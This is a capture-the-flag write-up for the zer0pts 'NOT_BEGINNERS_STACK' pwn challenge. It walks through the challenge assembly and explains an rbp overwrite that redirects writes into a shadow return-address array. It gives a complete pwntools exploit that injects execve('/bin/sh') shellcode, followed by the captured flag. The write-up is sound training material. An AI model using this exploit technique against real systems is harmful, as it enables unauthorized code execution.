# **NOT_BEGINNERS_STACK**
##Task
nc pwn.ctf.zer0pts.com 9011
File: chall FOR_BEGINNERS.md main.S
Tag: binary exploitation

##Solution

### Checksec
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
* No PIE assume to overwrite GOT
### Source
```asm
global _start
section .text

%macro call 1
;; __stack_shadow[__stack_depth++] = return_address;
  mov ecx, [__stack_depth]
  mov qword [__stack_shadow + rcx * 8], %%return_address
  inc dword [__stack_depth]
;; goto function
  jmp %1
  %%return_address:
%endmacro

%macro ret 0
;; goto __stack_shadow[--__stack_depth];
  dec dword [__stack_depth]
  mov ecx, [__stack_depth]
  jmp qword [__stack_shadow + rcx * 8]
%endmacro

_start:
  call notvuln
  call exit

notvuln:
;; char buf[0x100];
  enter 0x100, 0
;; vuln();
  call vuln
;; write(1, "Data: ", 6);
  mov edx, 6
  mov esi, msg_data
  xor edi, edi
  inc edi
  call write
;; read(0, buf, 0x100);
  mov edx, 0x100
  lea rsi, [rbp-0x100]
  xor edi, edi
  call read
;; return 0;
  xor eax, eax
  ret

vuln:
;; char buf[0x100];
  enter 0x100, 0
;; write(1, "Data: ", 6);
  mov edx, 6
  mov esi, msg_data
  xor edi, edi
  inc edi
  call write
;; read(0, buf, 0x1000);
  mov edx, 0x1000               ; [!] vulnerability
  lea rsi, [rbp-0x100]
  xor edi, edi
  call read
;; return;
  leave
  ret

read:
  xor eax, eax
  syscall
  ret

write:
  xor eax, eax
  inc eax
  syscall
  ret

exit:
  mov eax, 60
  syscall
  hlt
  
section .data
msg_data:
  db "Data: "
__stack_depth:
  dd 0

section .bss
__stack_shadow:
  resb 1024
```
This challenges use the special return address technique. It doesn't push the return address to stack but storing it into bss section with `__stack_shadow` array

Following the tutorial, We will overwrite the rbp register
### the vuln here
```asm
vuln:
;; char buf[0x100];
  enter 0x100, 0
;; write(1, "Data: ", 6);
  mov edx, 6
  mov esi, msg_data
  xor edi, edi
  inc edi
  call write
;; read(0, buf, 0x1000);
  mov edx, 0x1000               ; [!] vulnerability
  lea rsi, [rbp-0x100]
  xor edi, edi
  call read
;; return;
  leave
  ret
```
```
notvuln:
;; char buf[0x100];
  enter 0x100, 0
;; vuln();
  call vuln
;; write(1, "Data: ", 6);
  mov edx, 6
  mov esi, msg_data
  xor edi, edi
  inc edi
  call write
;; read(0, buf, 0x100);
  mov edx, 0x100
  lea rsi, [rbp-0x100]
  xor edi, edi
  call read
;; return 0;
  xor eax, eax
  ret
```
The `vuln` and `notvuln` use the same rbp, so we overwrite `[rbp-0x100]` with `__stack_shadow` address . Then, with the second write to [rbp-0x100] (now is `__stack_shadow`) in `notvuln` we will write the return address of `read` function to the address of shell code and the shellcraft next after it
### Script python using pwntools
```python
from pwn import *

context.arch = "amd64"

#p = process("./chall")
r = remote("pwn.ctf.zer0pts.com", 9011)
e = ELF("./chall")

jmp = e.sym["__stack_shadow"]

shellcode = asm(shellcraft.execve("/bin/sh", 0, 0))

payload = b"a"*0x100
payload += p64(jmp + 0x108) # because the offset is __stack__shadow+8 when call the read in the notvuln func (we overwrite the return address of `call read` )

r.sendafter("Data: ", payload) #overwrite rbp
r.sendafter("Data: ", p64(jmp + 16)+shellcode) # address of the shell is now __stack_shadow + 16 

r.interactive()
```
### Output
```bash
$ cat flag-*.txt
zer0pts{1nt3rm3d14t3_pwn3r5_l1k3_2_0v3rwr1t3_s4v3d_RBP}
```